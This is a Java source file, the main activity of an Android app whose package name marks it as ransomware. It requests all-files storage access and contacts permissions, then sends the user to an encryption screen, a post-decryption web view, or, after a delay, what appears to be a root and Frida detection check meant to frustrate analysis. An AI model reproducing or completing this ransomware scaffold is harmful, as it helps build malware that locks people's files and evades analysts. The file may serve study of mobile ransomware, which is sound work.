package com.example.nonameappransomware;

import android.Manifest;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.os.Handler;
import android.provider.Settings;
import android.widget.Toast;

import androidx.activity.EdgeToEdge;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import androidx.core.graphics.Insets;
import androidx.core.view.ViewCompat;
import androidx.core.view.WindowInsetsCompat;

public class MainActivity extends AppCompatActivity {

    private Handler handler = new Handler();

    private static final String PREF_ENCRYPT_ACTIVE = "encrypt_active";
    private static final String PREF_DECRYPT_ACTIVE = "decrypt_active";
    private static final String PREF_EXTERNAL_STORAGE_REQUESTED = "external_storage_requested";
    private static final String PREF_CONTACTS_REQUESTED = "contacts_requested";

    private static final int REQUEST_PERMISSIONS_CODE = 1;

    private static final String[] REQUIRED_PERMISSIONS = new String[]{
            Manifest.permission.READ_EXTERNAL_STORAGE,
            Manifest.permission.WRITE_EXTERNAL_STORAGE,
            Manifest.permission.READ_CONTACTS,
            Manifest.permission.WRITE_CONTACTS
    };

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        EdgeToEdge.enable(this);
        setContentView(R.layout.activity_main);

        ViewCompat.setOnApplyWindowInsetsListener(findViewById(R.id.main), (v, insets) -> {
            Insets systemBars = insets.getInsets(WindowInsetsCompat.Type.systemBars());
            v.setPadding(systemBars.left, systemBars.top, systemBars.right, systemBars.bottom);
            return insets;
        });

        SharedPreferences preferences = getSharedPreferences("app_prefs", MODE_PRIVATE);

        if (!allPermissionsGranted()) {
            requestNecessaryPermissions();
            preferences.edit().putBoolean(PREF_EXTERNAL_STORAGE_REQUESTED, true).apply();
            preferences.edit().putBoolean(PREF_CONTACTS_REQUESTED, true).apply();
        } else {
            proceedAfterPermissionCheck();
        }
    }

    private boolean allPermissionsGranted() {
        for (String permission : REQUIRED_PERMISSIONS) {
            if (ContextCompat.checkSelfPermission(this, permission) != PackageManager.PERMISSION_GRANTED) {
                return false;
            }
        }

        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            return Environment.isExternalStorageManager();
        }

        return true;
    }

    private void requestNecessaryPermissions() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
            if (!Environment.isExternalStorageManager()) {
                Intent intent = new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION);
                startActivityForResult(intent, REQUEST_PERMISSIONS_CODE);
            }
        } else {
            ActivityCompat.requestPermissions(this, REQUIRED_PERMISSIONS, REQUEST_PERMISSIONS_CODE);
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);

        if (requestCode == REQUEST_PERMISSIONS_CODE) {
            if (allPermissionsGranted()) {
                proceedAfterPermissionCheck();
            } else {
                Toast.makeText(this, "Permissions are required for this app to function", Toast.LENGTH_SHORT).show();
            }
        }
    }

    private void proceedAfterPermissionCheck() {
        if (isEncryptActive()) {
            Intent intent = new Intent(MainActivity.this, EncryptActivity.class);
            startActivity(intent);
            finish();
        } else if (isDecryptActive()) {
            Intent intent = new Intent(MainActivity.this, WebViewActivity.class); // 복호화 성공 시 이동할 액티비티
            startActivity(intent);
            finish();
        } else {
            handler.postDelayed(() -> {
                Intent intent = new Intent(MainActivity.this, RootFridaCheckActivity.class);
                startActivity(intent);
                finish();
            }, 3000);
        }
    }

    private boolean isEncryptActive() {
        SharedPreferences preferences = getSharedPreferences("app_prefs", MODE_PRIVATE);
        return preferences.getBoolean(PREF_ENCRYPT_ACTIVE, false);
    }

    private boolean isDecryptActive() {
        SharedPreferences preferences = getSharedPreferences("app_prefs", MODE_PRIVATE);
        return preferences.getBoolean(PREF_DECRYPT_ACTIVE, false);
    }
}
